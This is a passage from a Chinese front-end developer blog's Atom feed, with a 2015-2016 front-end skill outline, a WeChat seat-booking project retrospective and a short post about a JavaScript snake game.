title="Isomorphic JavaScript"></a>Isomorphic JavaScript</h3><ul><li><p>同构原理</p></li><li><p>同构方案 Rendr</p></li><li><p>nodejs: 服务器</p></li><li><p>hapi: 应用服务</p></li><li><p>backbone.js: 后台mvc</p></li><li><p>requirejs: 模块加载</p></li><li><p>jquery: dom处理</p></li><li><p>reactjs同构:React + Flux + Koa</p></li></ul><h3 id="双向数据绑定"><a href="#双向数据绑定" class="headerlink" title="双向数据绑定"></a>双向数据绑定</h3><ul><li><p>函数触发:vuejs</p></li><li><p>脏数据检测:angular</p></li><li><p>对象hijacking:avalon</p></li></ul><h3 id="browserify运行原理"><a href="#browserify运行原理" class="headerlink" title="browserify运行原理"></a>browserify运行原理</h3><ul><li><p>1.从入口模块开始分析require函数调用</p></li><li><p>2.根据依赖生成AST</p></li><li><p>3.根据AST找到每个模块的模块名</p></li><li><p>4.得到每个模块的依赖关系，生成一个依赖字典</p></li><li><p>5.包装每个模块（传入依赖字典以及export和require函数），生成执行的js</p></li></ul><h3 id="performance-timing"><a href="#performance-timing" class="headerlink" title="performance timing"></a>performance timing</h3><ul><li><p>performance timing api</p></li><li><p>performance timing 过程</p></li><li><p>performance timing 性能计算</p></li><li><p>performanceTrace库</p></li></ul><h3 id="组件UI与js组件规范化"><a href="#组件UI与js组件规范化" class="headerlink" title="组件UI与js组件规范化"></a>组件UI与js组件规范化</h3><ul><li><p>组件编码规范</p></li><li><p>组件目录规范：组件目录与公用目录</p></li><li><p>组件构建规范：构建环境支持</p></li><li><p>组件模块化管理：spm，bowserify</p></li><li><p>组件复用性管理</p></li><li><p>第三方组件接入成本</p></li></ul><h3 id="immutable-JavaScript"><a href="#immutable-JavaScript" class="headerlink" title="immutable JavaScript"></a>immutable JavaScript</h3><h3 id="generator与promise原理与使用"><a href="#generator与promise原理与使用" class="headerlink" title="generator与promise原理与使用"></a>generator与promise原理与使用</h3><h2 id="二、构建生态"><a href="#二、构建生态" class="headerlink" title="二、构建生态"></a>二、构建生态</h2><h3 id="grunt-gulp开发环境任务编写"><a href="#grunt-gulp开发环境任务编写" class="headerlink" title="grunt/gulp开发环境任务编写"></a>grunt/gulp开发环境任务编写</h3><ul><li><p>文件处理插件：html、scss、js、image、font、其它</p></li><li><p>优化插件：雪碧图、图片压缩、iconfont构建</p></li><li><p>发布替换插件</p></li><li><p>打包、压缩包插件：组件自动分析</p></li><li><p>白名单配置</p></li><li><p>自定义插件编写</p></li></ul><h3 id="npm、jspm、bower包管理工具"><a href="#npm、jspm、bower包管理工具" class="headerlink" title="npm、jspm、bower包管理工具"></a>npm、jspm、bower包管理工具</h3><h3 id="r-js、browserify、webpack、webpack-2、Rollup打包工具使用"><a href="#r-js、browserify、webpack、webpack-2、Rollup打包工具使用" class="headerlink" title="r.js、browserify、webpack、webpack 2、Rollup打包工具使用"></a>r.js、browserify、webpack、webpack 2、Rollup打包工具使用</h3><ul><li><p>原理：根据依赖配置文件对文件进行依赖打包</p></li><li><p>webpack支持更多的规范打包，AMD,Commonjs</p></li><li><p>webpack+babel/reactjs+reflux</p></li></ul><h3 id="fis3构建与插件开发、构建环境、fis3构建离线包"><a href="#fis3构建与插件开发、构建环境、fis3构建离线包" class="headerlink" title="fis3构建与插件开发、构建环境、fis3构建离线包"></a>fis3构建与插件开发、构建环境、fis3构建离线包</h3><h3 id="web-Component：rosetta-org、x-view、Q、riot、nova"><a href="#web-Component：rosetta-org、x-view、Q、riot、nova" class="headerlink" title="web Component：rosetta-org、x-view、Q、riot、nova"></a>web Component：rosetta-org、x-view、Q、riot、nova</h3><h3 id="brunch构建工具"><a href="#brunch构建工具" class="headerlink" title="brunch构建工具"></a>brunch构建工具</h3><h2 id="三、开发技巧与调试"><a href="#三、开发技巧与调试" class="headerlink" title="三、开发技巧与调试"></a>三、开发技巧与调试</h2><h3 id="fiddler加willow基础组合调试"><a href="#fiddler加willow基础组合调试" class="headerlink" title="fiddler加willow基础组合调试"></a>fiddler加willow基础组合调试</h3><ul><li><p>常见配置与分析</p></li><li><p>结合浏览器调试</p></li></ul><h3 id="werien、vorlonjs远程调试，chrome-inspect"><a href="#werien、vorlonjs远程调试，chrome-inspect" class="headerlink" title="werien、vorlonjs远程调试，chrome inspect"></a>werien、vorlonjs远程调试，chrome inspect</h3><h3 id="mockjs，F-M-S-Front-Mock-Server-模拟调试使用与cgi自动调试"><a href="#mockjs，F-M-S-Front-Mock-Server-模拟调试使用与cgi自动调试" class="headerlink" title="mockjs，F.M.S(Front Mock Server)模拟调试使用与cgi自动调试"></a>mockjs，F.M.S(Front Mock Server)模拟调试使用与cgi自动调试</h3><h3 id="macha-phantomjs-casperjs-karma测试自动化任务使用"><a href="#macha-phantomjs-casperjs-karma测试自动化任务使用" class="headerlink" title="macha/phantomjs/casperjs/karma测试自动化任务使用"></a>macha/phantomjs/casperjs/karma测试自动化任务使用</h3><h3 id="自动化UI测试，海豚"><a href="#自动化UI测试，海豚" class="headerlink" title="自动化UI测试，海豚"></a>自动化UI测试，海豚</h3><h3 id="node-supervior、node-inspector、karma"><a href="#node-supervior、node-inspector、karma" class="headerlink" title="node-supervior、node-inspector、karma"></a>node-supervior、node-inspector、karma</h3><h3 id="开发发布系统流程"><a href="#开发发布系统流程" class="headerlink" title="开发发布系统流程"></a>开发发布系统流程</h3><h3 id="sublime高效插件"><a href="#sublime高效插件" class="headerlink" title="sublime高效插件"></a>sublime高效插件</h3><ul><li>emmet工具使用、 sublimelinter、 babel snippets、 sublimeLint、 SassBeautify 、 emmet 快速编辑、 jsxlint、 SideBarEnhancements、 SnippetsMaker、 SublimeCodeIntel、 css snippets、 ColorPicker、 html/css/js Pretty、 SpinnetMacker、 DocBlockr、 MultiEditUtils、 javascript &amp; node spinnet、 JavaScript &amp; NodeJS Snippets、 jsLint、cssLint<h3 id="代码自动化检查fecs"><a href="#代码自动化检查fecs" class="headerlink" title="代码自动化检查fecs"></a>代码自动化检查fecs</h3></li></ul><h2 id="四、html、css与重构"><a href="#四、html、css与重构" class="headerlink" title="四、html、css与重构"></a>四、html、css与重构</h2><h3 id="jpeg、webp、apng、bpg图片"><a href="#jpeg、webp、apng、bpg图片" class="headerlink" title="jpeg、webp、apng、bpg图片"></a>jpeg、webp、apng、bpg图片</h3><ul><li><p>编码原理</p></li><li><p>特点与优劣势</p></li><li><p>适用场景</p></li></ul><h3 id="iconfont使用与实现原理"><a href="#iconfont使用与实现原理" class="headerlink" title="iconfont使用与实现原理"></a>iconfont使用与实现原理</h3><ul><li><p>自动打包构建方法</p></li><li><p>iconfont兼容性写法</p></li><li><p>fonthello、fontawesome、icomoon.io、iconfont.cn线上工具</p></li></ul><h3 id="页面响应式设计"><a href="#页面响应式设计" class="headerlink" title="页面响应式设计"></a>页面响应式设计</h3><ul><li><p>layout布局响应式</p></li><li><p>html结构响应式</p></li><li><p>css样式响应式</p></li><li><p>image媒体响应式</p></li><li><p>javascript响应式</p></li><li><p>media query与平台判断</p></li></ul><h3 id="css重置"><a href="#css重置" class="headerlink" title="css重置"></a>css重置</h3><ul><li><p>reset</p></li><li><p>nomalize</p></li><li><p>neat</p></li></ul><h3 id="sass-compass-less-postcss常用语法与使用"><a href="#sass-compass-less-postcss常用语法与使用" class="headerlink" title="sass/compass/less/postcss常用语法与使用"></a>sass/compass/less/postcss常用语法与使用</h3><ul><li><p>常用语法功能</p></li><li><p>组件化UI设计管理</p></li><li><p>构建工具实现方案</p></li><li><p>雪碧图自动合成</p></li><li><p>iconfont自动接入等等</p></li></ul><h3 id="media-query与常见页面尺寸了解"><a href="#media-query与常见页面尺寸了解" class="headerlink" title="media query与常见页面尺寸了解"></a>media query与常见页面尺寸了解</h3><ul><li><p>媒体类型引入和媒体特性引入</p></li><li><p>device-width适应</p></li><li><p>retina屏幕适应</p></li></ul><h3 id="em-rem原理与实现"><a href="#em-rem原理与实现" class="headerlink" title="em,rem原理与实现"></a>em,rem原理与实现</h3><ul><li><p>rem计算：width*retina/10，相当于屏幕宽度为10rem</p></li><li><p>字体在rem情况下仍然使用px</p></li></ul><h3 id="code4ui、code4app、初页、maka等"><a href="#code4ui、code4app、初页、maka等" class="headerlink" title="code4ui、code4app、初页、maka等"></a>code4ui、code4app、初页、maka等</h3><ul><li><p>前端dom操作即使刷新前端页面</p></li><li><p>根据dom操作生成组件config配置保存到db</p></li><li><p>根据config配置使用r.js或webpack打包</p></li><li><p>发布打包后输出文件</p></li></ul><h3 id="css3动画"><a href="#css3动画" class="headerlink" title="css3动画"></a>css3动画</h3><ul><li><p>transform</p></li><li><p>animation</p></li><li><p>transiction</p></li><li><p>3D加速与动画加速</p></li><li><p>动画库</p></li><li><p>缓动函数速查表： <a href="http://www.xuanfengge.com/easeing/easeing/" target="_blank" rel="noopener">http://www.xuanfengge.com/easeing/easeing/</a></p></li><li><p>Ceaser： <a href="http://xuanfengge.com/easeing/ceaser/" target="_blank" rel="noopener">http://xuanfengge.com/easeing/ceaser/</a></p></li><li><p>cubic-bezier： <a href="http://cubic-bezier.com/" target="_blank" rel="noopener">http://cubic-bezier.com/</a></p></li></ul><h3 id="css网格布局"><a href="#css网格布局" class="headerlink" title="css网格布局"></a>css网格布局</h3><ul><li>susy</li><li><p>Responsive Grid System</p></li><li><p>Fluid 960 Grid(adaptjs)</p></li><li><p>Simple Grid</p></li></ul><h3 id="搜索引擎与前端SEO"><a href="#搜索引擎与前端SEO" class="headerlink" title="搜索引擎与前端SEO"></a>搜索引擎与前端SEO</h3><ul><li><p>tdk优化</p></li><li><p>页面内容优化</p></li><li><p>唯一的H1标题</p></li><li><p>img设置alt属性</p></li><li><p>nofollow</p></li><li><p>url优化</p></li><li><p>统一链接</p></li><li><p>301跳转</p></li><li><p>canonical</p></li><li><p>robot优化</p></li><li><p>robots.txt</p></li><li><p>meta robots</p></li><li><p>sitemap</p></li><li><p>SEO工具</p></li><li><p>各种站长工具等</p></li></ul><h3 id="浏览器缓存种类，resources-webSQL-indexDB-localstorage-cookie-app-cache-cache-storage"><a href="#浏览器缓存种类，resources-webSQL-indexDB-localstorage-cookie-app-cache-cache-storage" class="headerlink" title="浏览器缓存种类，resources,webSQL,indexDB, localstorage,cookie,app cache,cache storage"></a>浏览器缓存种类，resources,webSQL,indexDB, localstorage,cookie,app cache,cache storage</h3><ul><li><p>store.js、cookie.js</p><h3 id="UI框架"><a href="#UI框架" class="headerlink" title="UI框架"></a>UI框架</h3></li><li><p>bootstrap、jqwidgets、semantic ui、amaze ui</p></li><li><p>微信手Q ui: frozenui、weui、blend ui</p></li><li><p>extjs、echart图表ui</p></li></ul><h2 id="五、native-hybrid-桌面开发"><a href="#五、native-hybrid-桌面开发" class="headerlink" title="五、native/hybrid/桌面开发"></a>五、native/hybrid/桌面开发</h2><h3 id="ionic移动开发方案"><a href="#ionic移动开发方案" class="headerlink" title="ionic移动开发方案"></a>ionic移动开发方案</h3><ul><li><p>运行架构</p></li><li><p>hybrid混合开发</p></li><li><p>cordova交互</p></li><li><p>离线包更新</p></li><li><p>性能瓶颈</p></li></ul><h3 id="nativescript移动开发方案"><a href="#nativescript移动开发方案" class="headerlink" title="nativescript移动开发方案"></a>nativescript移动开发方案</h3><h3 id="react-Native移动开发方案"><a href="#react-Native移动开发方案" class="headerlink" title="react Native移动开发方案"></a>react Native移动开发方案</h3><ul><li><p>运行架构：js引擎</p></li><li><p>性能缺陷与内存泄露</p></li><li><p>更新机制</p></li><li><p>使用场景</p></li></ul><h3 id="android-ios原生开发与框架"><a href="#android-ios原生开发与框架" class="headerlink" title="android/ios原生开发与框架"></a>android/ios原生开发与框架</h3><ul><li><p>java</p></li><li><p>oc、swift</p></li><li><p>web与native交互</p></li><li><p>屏幕旋转</p></li><li><p>摇一摇</p></li><li><p>录像，拍照，选取本地图片</p></li><li><p>打电话，发短信</p></li><li><p>电池电量</p></li><li><p>地理位置</p></li><li><p>日期选择</p></li><li><p>开启硬件加速</p></li></ul><h3 id="桌面应用开发"><a href="#桌面应用开发" class="headerlink" title="桌面应用开发"></a>桌面应用开发</h3><ul><li><p>nodewebkit</p></li><li><p>atom-shell(后改名为electron)</p></li><li><p>网易Hex</p></li><li><p>pomelo(游戏服务器框架)</p></li><li><p>react desktop</p></li><li><p>appjs:appjs.com</p></li></ul><h2 id="六、前端-H5优化-另一个图已给出"><a href="#六、前端-H5优化-另一个图已给出" class="headerlink" title="六、前端/H5优化(另一个图已给出)"></a>六、前端/H5优化(另一个图已给出)</h2><h3 id="yslow、pagespeed"><a href="#yslow、pagespeed" class="headerlink" title="yslow、pagespeed"></a>yslow、pagespeed</h3><h3 id="移动web性能优化"><a href="#移动web性能优化" class="headerlink" title="移动web性能优化"></a>移动web性能优化</h3><ul><li><p>手机浏览器”省流量”原理</p></li><li><p>增量更新原理及注意事项</p></li><li><p>本地存储的应用</p></li><li><p>加载优化</p></li><li><p>图片优化</p></li><li><p>单页面及路由实现</p></li><li><p>业内著名站点案例分析</p></li></ul><h2 id="七、全栈-全端开发"><a href="#七、全栈-全端开发" class="headerlink" title="七、全栈/全端开发"></a>七、全栈/全端开发</h2><p>###　express/node club + mongodb、thinkjs等框架</p><h3 id="node-js直出"><a href="#node-js直出" class="headerlink" title="node.js直出"></a>node.js直出</h3><h3 id="实时web开发，meteo-express-io"><a href="#实时web开发，meteo-express-io" class="headerlink" title="实时web开发，meteo/express.io"></a>实时web开发，meteo/express.io</h3><h3 id="MEAN-mongodb-express-angular-nodejs"><a href="#MEAN-mongodb-express-angular-nodejs" class="headerlink" title="MEAN(mongodb/express/angular/nodejs)"></a>MEAN(mongodb/express/angular/nodejs)</h3><h3 id="http与http2协议、bigpipe、pipeline"><a href="#http与http2协议、bigpipe、pipeline" class="headerlink" title="http与http2协议、bigpipe、pipeline"></a>http与http2协议、bigpipe、pipeline</h3><h3 id="离线缓存，cookie、localstorage、indexdb"><a href="#离线缓存，cookie、localstorage、indexdb" class="headerlink" title="离线缓存，cookie、localstorage、indexdb"></a>离线缓存，cookie、localstorage、indexdb</h3><h3 id="cdn与dns"><a href="#cdn与dns" class="headerlink" title="cdn与dns"></a>cdn与dns</h3><ul><li><p>动态域名加速</p></li><li><p>cdn原理与cdn combo</p></li></ul><h2 id="八、研究实验"><a href="#八、研究实验" class="headerlink" title="八、研究实验"></a>八、研究实验</h2><h3 id="WebAssembly、webTRC、typescript"><a href="#WebAssembly、webTRC、typescript" class="headerlink" title="WebAssembly、webTRC、typescript"></a>WebAssembly、webTRC、typescript</h3><h3 id="Material-design规范的前端框架"><a href="#Material-design规范的前端框架" class="headerlink" title="Material design规范的前端框架"></a>Material design规范的前端框架</h3><ul><li><p>交互动效库</p><h3 id="AMP-HTML规范"><a href="#AMP-HTML规范" class="headerlink" title="AMP-HTML规范"></a>AMP-HTML规范</h3></li><li><p>使用受限HTML以及缓存技术来提高移动网络中静态内容的性能</p></li><li><p>添加自定义的元素代替禁用掉的元素：amp-audio, amp-img、amp-video等</p></li></ul><h2 id="九、数据分析与监控"><a href="#九、数据分析与监控" class="headerlink" title="九、数据分析与监控"></a>九、数据分析与监控</h2><ul><li><p>badjs数据上报</p></li><li><p>捕获错误两种方法：onerror、try-catch。抽样上报，先onerror统计语法错误，如果是script error，再使用tryjs。</p></li><li><p>后台统计方法、不同业务接入体系、抽样统计</p></li><li><p>onerror:可以捕捉语法错误和运行时错误；可以拿到出错的信息，堆栈，出错文件、行号、列号；当前页面执行的js脚本出错都会捕捉到；跨域的资源需要特殊头部支持。</p></li><li><p>try-catch:无法捕捉语法错误，只能捕捉运行时错误；可以拿到出错的信息，堆栈，出错文件、行号、列号；需要借助工具把function块以及文件块加入try,catch，可以在这个阶段打入更多的静态信息。</p></li></ul><h3 id="点击热力图clickHeat、heatMap"><a href="#点击热力图clickHeat、heatMap" class="headerlink" title="点击热力图clickHeat、heatMap"></a>点击热力图clickHeat、heatMap</h3><h3 id="js加载失败优化方案"><a href="#js加载失败优化方案" class="headerlink" title="js加载失败优化方案"></a>js加载失败优化方案</h3><ul><li><p>失败重发机制</p></li><li><p>加载源域名服务器文件</p></li><li><p>https反劫持</p></li></ul><h3 id="百度alog数据上报"><a href="#百度alog数据上报" class="headerlink" title="百度alog数据上报"></a>百度alog数据上报</h3><h2 id="十、其它软技能"><a href="#十、其它软技能" class="headerlink" title="十、其它软技能"></a>十、其它软技能</h2><h3 id="axure-原型图设计"><a href="#axure-原型图设计" class="headerlink" title="axure 原型图设计"></a>axure 原型图设计</h3><h3 id="xmind脑图管理"><a href="#xmind脑图管理" class="headerlink" title="xmind脑图管理"></a>xmind脑图管理</h3><h3 id="效率管理"><a href="#效率管理" class="headerlink" title="效率管理"></a>效率管理</h3><h3 id="can-i-use、github"><a href="#can-i-use、github" class="headerlink" title="can i use、github"></a>can i use、github</h3><h3 id="知识管理-总结分享"><a href="#知识管理-总结分享" class="headerlink" title="知识管理/总结分享"></a>知识管理/总结分享</h3><h3 id="产品思维与技能"><a href="#产品思维与技能" class="headerlink" title="产品思维与技能"></a>产品思维与技能</h3><h2 id="十一、前端技术网站"><a href="#十一、前端技术网站" class="headerlink" title="十一、前端技术网站"></a>十一、前端技术网站</h2><h3 id="技术社区"><a href="#技术社区" class="headerlink" title="技术社区"></a>技术社区</h3><ul><li><p>w3c tech、w3c plus、w3 help</p></li><li><p>div.io、nodeParty</p></li><li><p>稀土掘金、前端早读课</p></li><li><p>alloyteam、html5基地</p></li><li><p>W3 help</p></li></ul><h3 id="行业会议"><a href="#行业会议" class="headerlink" title="行业会议"></a>行业会议</h3><ul><li><p>segmentfault会议</p></li><li><p>深js、杭js</p></li><li><p>GMIC(全球移动互联网大会)</p></li><li><p>D2、webrebuild</p></li><li><p>infoQ内容、Qcon、velocity</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;2015-2016-前端技能体系图&quot;&gt;&lt;a href=&quot;#2015-2016-前端技能体系图&quot; class=&quot;headerlink&quot; title=&quot;2015-2016 前端技能体系图&quot;&gt;&lt;/a&gt;2015-2016 前端技能体系图&lt;/h2&gt;&lt;h3 id=&quot;转自ouvens的github&quot;&gt;&lt;a href=&quot;#转自ouvens的github&quot; class=&quot;headerlink&quot; title=&quot;转自ouvens的github&quot;&gt;&lt;/a&gt;转自ouvens的github&lt;/h3&gt;&lt;p&gt;茫茫前端大海，学海无涯，苦作舟
    
    </summary>
    
      <category term="前端工程" scheme="http://luoxia.me/code/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/"/>
    
    
      <category term="前端体系" scheme="http://luoxia.me/code/tags/%E5%89%8D%E7%AB%AF%E4%BD%93%E7%B3%BB/"/>
    
  </entry>
  
  <entry>
    <title>微信订座系统项目总结</title>
    <link href="http://luoxia.me/code/2016/03/12/%E5%BE%AE%E4%BF%A1%E8%AE%A2%E5%BA%A7%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/"/>
    <id>http://luoxia.me/code/2016/03/12/微信订座系统项目总结/</id>
    <published>2016-03-12T14:30:12.000Z</published>
    <updated>2017-11-16T13:10:06.491Z</updated>
    
    <content type="html"><![CDATA[<p>不管学什么，到最后必须要通过实践的检验，开发也是如此，正如邓小平同志的一句：<strong>实践是检验真理的唯一标准</strong>,在实战中的进步是最大的，这是第一次正式地外包项目，是中国美院的一个关于课堂微信订座项目，本身并没有什么经验，更何况移动端，这次项目主要是大致的了解一下一款产品上线的流程吧，当然也有一些编码上的总结。希望在后面能够通过更多的实战项目来锻炼自己。<br>  <a id="more"></a></p><h3 id="一．项目整体流程"><a href="#一．项目整体流程" class="headerlink" title="一．项目整体流程"></a>一．项目整体流程</h3><pre><code>1. 分析用户需求，产品功能2. 设计图材料3. 业务逻辑4. 分工合作5. 提交， 不断完善，修复bug</code></pre><h3 id="二．遇到的问题及解决办法"><a href="#二．遇到的问题及解决办法" class="headerlink" title="二．遇到的问题及解决办法"></a>二．遇到的问题及解决办法</h3><h4 id="html部分"><a href="#html部分" class="headerlink" title="html部分:"></a>html部分:</h4><pre><code>1. html5新标签，新属性应用（input的placeholder属性，type=”date”）；2. 命名规则</code></pre><h4 id="css部分："><a href="#css部分：" class="headerlink" title="css部分："></a>css部分：</h4><pre><code>1. 设计图各部分尺寸比例，ps测量；2. 移动端适配，meta标签使用，视口等理解；3. 移动端对flex box布局方式的支持，考虑用浮动布局；4. 图片大小压缩问题，宽度设置，高度自适应;5. 苹果手机自动缩放屏幕问题，禁止用户缩放;</code></pre><h4 id="js部分："><a href="#js部分：" class="headerlink" title="js部分："></a>js部分：</h4><pre><code>1. 用闭包解决js无块级作用域的影响；2. 自定义特性不会自动添加到dom对象属性；3. 自定义dom对象属性也不会添加到特性；4. 与后台数据对接，封装函数，做好接口；</code></pre><h3 id="三．思考改进"><a href="#三．思考改进" class="headerlink" title="三．思考改进"></a>三．思考改进</h3><pre><code>1. 命名规范2. W3C标准3. 使用框架开发，bootstrap或者jquery mobile4. 简化逻辑，性能优化5. 代码可维护性6. 开发效率</code></pre><h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h3><pre><code>1. 图片和其他非代码文件放在单独的文件夹2. 变量声明和函数声明写在最前面，以增加代码的可维护性3. 使用动态改变元素的class来改变元素的样式4. 将雪碧图放到一个数组里，循环适用于多个元素5. html5在DOM上的扩展，自定义特性可以通过元素的dataset属性来访问自定义特性对于于DOM对象中的属性</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;不管学什么，到最后必须要通过实践的检验，开发也是如此，正如邓小平同志的一句：&lt;strong&gt;实践是检验真理的唯一标准&lt;/strong&gt;,在实战中的进步是最大的，这是第一次正式地外包项目，是中国美院的一个关于课堂微信订座项目，本身并没有什么经验，更何况移动端，这次项目主要是大致的了解一下一款产品上线的流程吧，当然也有一些编码上的总结。希望在后面能够通过更多的实战项目来锻炼自己。&lt;br&gt;
    
    </summary>
    
      <category term="项目总结" scheme="http://luoxia.me/code/categories/%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="项目总结" scheme="http://luoxia.me/code/tags/%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>snake game</title>
    <link href="http://luoxia.me/code/2016/03/12/snake-game/"/>
    <id>http://luoxia.me/code/2016/03/12/snake-game/</id>
    <published>2016-03-12T13:00:42.000Z</published>
    <updated>2017-11-16T13:10:06.489Z</updated>
    
    <content type="html"><![CDATA[<h1 id="javascript原生贪吃蛇游戏"><a href="#javascript原生贪吃蛇游戏" class="headerlink" title="javascript原生贪吃蛇游戏"></a>javascript原生贪吃蛇游戏</h1><p><img src="http://7xsi10.com2.z0.glb.clouddn.com/psb%20%282%29.jpg" alt="snake1"><br><a id="more"></a></p><h4 id="附上两张效果图"><a href="#附上两张效果图" class="headerlink" title="附上两张效果图"></a>附上两张效果图</h4><p><img src="http://7xsi10.com2.z0.glb.clouddn.com/psb%20%281%29.jpg" alt="snake2"><br><img src="http://7xsi10.com2.z0.glb.clouddn.com/psb.jpg" alt="snake3"></p><h3 id="源码已经托管到我的github，点击进入我的github"><a href="#源码已经托管到我的github，点击进入我的github" class="headerlink" title="源码已经托管到我的github，点击进入我的github"></a>源码已经托管到我的github，点击进入<a href="https://github.com/laoqiren" target="_blank" rel="noopener">我的github</a></h3>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;javascript原生贪吃蛇游戏&quot;&gt;&lt;a href=&quot;#javascript原生贪吃蛇游戏&quot; class=&quot;headerlink&quot; title=&quot;javascript原生贪吃蛇游戏&quot;&gt;&lt;/a&gt;javascript原生贪吃蛇游戏&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;http://7xsi10.com2.z0.glb.clouddn.com/psb%20%282%29.jpg&quot; alt=&quot;snake1&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="JavaScript" scheme="http://luoxia.me/code/categories/JavaScript/"/>
    
    
      <category term="javascript源码" scheme="http://luoxia.me/code/tags/javascript%E6%BA%90%E7%A0%81/"/>
    
  </entry>
  
</feed>
